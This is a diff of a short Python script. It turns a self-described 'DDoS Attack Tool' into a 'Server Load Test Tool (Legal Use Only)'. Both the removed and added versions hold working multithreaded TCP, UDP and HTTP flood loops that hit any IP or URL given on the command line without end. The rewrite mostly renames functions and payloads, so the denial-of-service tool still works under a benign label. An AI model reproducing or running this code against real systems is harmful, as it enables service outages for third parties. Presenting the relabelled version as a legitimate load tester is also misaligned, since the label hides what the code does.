@@ -1,69 +1,63 @@
 import socket
 import threading
 import time
-import random
 import requests
 import argparse
 
-def tcp_ddos_attack(target_ip, target_port, packets_per_second):
-    delay = 1.0 / packets_per_second
+def tcp_test(target_ip, target_port, rate):
+    delay = 1.0 / rate
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1)
             s.connect((target_ip, target_port))
-            s.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
+            s.send(b"PING_TEST")
             s.close()
-        except socket.error:
+        except:
             pass
         time.sleep(delay)
 
-def udp_ddos_attack(target_ip, target_port, packets_per_second):
-    delay = 1.0 / packets_per_second
+def udp_test(target_ip, target_port, rate):
+    delay = 1.0 / rate
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.sendto(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n", (target_ip, target_port))
-        except socket.error:
+            s.sendto(b"PING_TEST", (target_ip, target_port))
+        except:
             pass
         time.sleep(delay)
 
-def http_ddos_attack(target_url, requests_per_second):
-    delay = 1.0 / requests_per_second
+def http_test(url, rate):
+    delay = 1.0 / rate
     while True:
         try:
-            requests.get(target_url)
-        except requests.exceptions.RequestException:
+            requests.get(url, timeout=1)
+        except:
             pass
         time.sleep(delay)
 
 def main():
-    parser = argparse.ArgumentParser(description="DDoS Attack Tool by: Sahikk (sahikk67)\nInstagram: https://www.instagram.com/ixe.67_/")
-    parser.add_argument("target_ip", help="Target IP address")
-    parser.add_argument("target_port", type=int, help="Target port")
-    parser.add_argument("target_url", help="Target URL for HTTP requests")
-    parser.add_argument("attack_type", choices=["tcp", "udp", "http"], help="Attack type (tcp/udp/http)")
-    parser.add_argument("packets_per_second", type=int, help="Packets per second")
-    parser.add_argument("requests_per_second", type=int, help="HTTP requests per second")
-    parser.add_argument("num_threads", type=int, help="Number of threads")
-    parser.add_argument("-h", "--help", action="help", help="Show this help message and exit")
+    parser = argparse.ArgumentParser(
+        description="Server Load Test Tool (Legal Use Only)"
+    )
+
+    parser.add_argument("mode", choices=["tcp", "udp", "http"], help="Test method")
+    parser.add_argument("target", help="IP or URL")
+    parser.add_argument("port", type=int, nargs="?", help="Port (for TCP/UDP)")
+    parser.add_argument("rate", type=int, help="Requests per second")
+    parser.add_argument("threads", type=int, help="Number of threads")
+
     args = parser.parse_args()
 
-    if args.attack_type == "tcp":
-        attack_function = tcp_ddos_attack
-    elif args.attack_type == "udp":
-        attack_function = udp_ddos_attack
-    elif args.attack_type == "http":
-        attack_function = http_ddos_attack
+    if args.mode == "http":
+        for _ in range(args.threads):
+            t = threading.Thread(target=http_test, args=(args.target, args.rate))
+            t.start()
     else:
-        print("Invalid attack type. Exiting.")
-        return
-
-    for _ in range(args.num_threads):
-        if args.attack_type == "http":
-            thread = threading.Thread(target=attack_function, args=(args.target_url, args.requests_per_second))
-        else:
-            thread = threading.Thread(target=attack_function, args=(args.target_ip, args.target_port, args.packets_per_second))
-        thread.start()
+        for _ in range(args.threads):
+            func = tcp_test if args.mode == "tcp" else udp_test
+            t = threading.Thread(target=func, args=(args.target, args.port, args.rate))
+            t.start()
 
 if __name__ == "__main__":
     main()
